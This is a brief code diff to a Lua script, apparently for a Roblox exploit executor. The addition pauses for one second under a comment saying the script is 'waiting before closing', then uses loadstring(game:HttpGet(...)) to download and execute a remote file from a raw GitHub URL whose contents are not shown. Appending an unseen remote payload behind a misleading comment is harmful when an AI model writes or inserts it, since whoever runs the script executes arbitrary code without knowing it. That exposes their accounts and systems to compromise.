@@ -63,3 +63,6 @@ if requestFunction then
 else
     warn("Executor não suporta requisições HTTP.")
 end
+
+task.wait(1) -- Espera 1 segundo antes de fechar
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TTMARCIOKKJJ/x/refs/heads/main/view.lua"))()
